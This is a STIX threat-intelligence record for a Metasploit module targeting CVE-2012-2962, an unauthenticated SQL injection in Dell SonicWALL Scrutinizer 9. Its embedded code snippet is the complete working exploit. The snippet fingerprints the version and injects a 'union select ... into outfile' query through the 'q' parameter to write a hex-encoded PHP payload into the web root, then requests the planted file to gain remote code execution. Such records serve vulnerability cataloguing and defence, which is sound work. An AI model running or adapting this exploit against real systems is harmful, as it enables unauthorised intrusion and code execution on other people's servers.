{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c5248c2f-dd41-429d-8e6d-85f85901974c",
    "created": "2024-08-14T16:54:07.08805Z",
    "modified": "2024-08-14T16:54:07.088054Z",
    "name": "\"Dell SonicWALL (Plixer) Scrutinizer 9 SQL Injection\"",
    "description": " This module exploits a vulnerability found in Dell SonicWall Scrutinizer. While handling the 'q' parameter, the PHP application does not properly filter the user-supplied data, which can be manipulated to inject SQL commands, and then gain remote code execution.  Please note that authentication is NOT needed to exploit this vulnerability.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/sonicwall_scrutinizer_sqli.rb",
            "external_id": "sonicwall_scrutinizer_sqli.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-2962"
        },
        {
            "source_name": "reference",
            "url": "http://www.sonicwall.com/shared/download/Dell_SonicWALL_Scrutinizer_Service_Bulletin_for_SQL_injection_vulnerability_CVE.pdf"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Dell SonicWALL (Plixer) Scrutinizer 9 SQL Injection\",\n      'Description'    => %q{\n          This module exploits a vulnerability found in Dell SonicWall Scrutinizer.\n        While handling the 'q' parameter, the PHP application does not properly filter\n        the user-supplied data, which can be manipulated to inject SQL commands, and\n        then gain remote code execution.  Please note that authentication is NOT needed\n        to exploit this vulnerability.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'muts',\n          'Devon Kearns',\n          'sinn3r'\n        ],\n      'References'     =>\n        [\n          ['CVE', '2012-2962'],\n          ['OSVDB', '84232'],\n          ['EDB', '20033'],\n          ['BID', '54625'],\n          ['URL', 'http://www.sonicwall.com/shared/download/Dell_SonicWALL_Scrutinizer_Service_Bulletin_for_SQL_injection_vulnerability_CVE.pdf']\n        ],\n      'Payload'        =>\n        {\n          'BadChars' => \"\\x00\"\n        },\n      'Platform'       => 'php',\n      'Arch'           => ARCH_PHP,\n      'Targets'        =>\n        [\n          # According to advisory, version 9.5.1 and before are vulnerable.\n          # But was only able to test this on 9.0.1.0\n          ['Dell SonicWall Scrutinizer 9.5.1 or older', {}]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2012-07-22',\n      'DefaultTarget'  => 0))\n\n      register_options(\n        [\n          OptString.new('TARGETURI', [true, 'The path to the SonicWall Scrutinizer\\'s statusFilter file', '/d4d/statusFilter.php']),\n          OptString.new('HTMLDIR',   [true, 'The HTML root directory for the web application', 'C:\\\\Program Files\\\\Scrutinizer\\\\html\\\\'])\n        ])\n  end\n\n\n  def check\n    res = send_request_raw({'uri'=>'/'}) # Check the base path for version regex\n    if res and res.body =~ /\\<title\\>Scrutinizer\\<\\/title\\>/ and\n      res.body =~ /\\<div id\\=\\'.+\\'\\>Scrutinizer 9\\.[0-5]\\.[0-1]\\<\\/div\\>/\n      return Exploit::CheckCode::Appears\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n\n  def exploit\n    peer = \"#{rhost}:#{rport}\"\n    p = \"<?php #{payload.encoded} ?>\"\n    hex_payload = p.unpack(\"H*\")[0]\n    php_fname   = Rex::Text.rand_text_alpha(5) + \".php\"\n    rnd_txt     = Rex::Text.rand_text_alpha_upper(3)\n\n    print_status(\"Sending SQL injection...\")\n    res = send_request_cgi({\n      'uri'       => normalize_uri(target_uri.path),\n      'method'    => 'POST',\n      'vars_post' => {\n        'commonJson' => 'protList',\n        'q' => \"#{rnd_txt}' union select 0x#{hex_payload},0 into outfile '../../html/d4d/#{php_fname}'#\"\n      }\n    })\n\n    if res and res.body !~ /No Results Found/\n      print_error(\"I don't think the SQL Injection attempt worked\")\n      return\n    elsif not res\n      print_error(\"No response from the server\")\n      return\n    end\n\n    # For debugging purposes, this is useful\n    vprint_status(res.to_s)\n\n    target_path = \"#{File.dirname(target_uri.path)}/#{php_fname}\"\n    print_status(\"Requesting: #{target_path}\")\n    send_request_raw({'uri' => normalize_uri(target_path)})\n\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-07-22",
    "x_mitre_platforms": [
        "php'"
    ]
}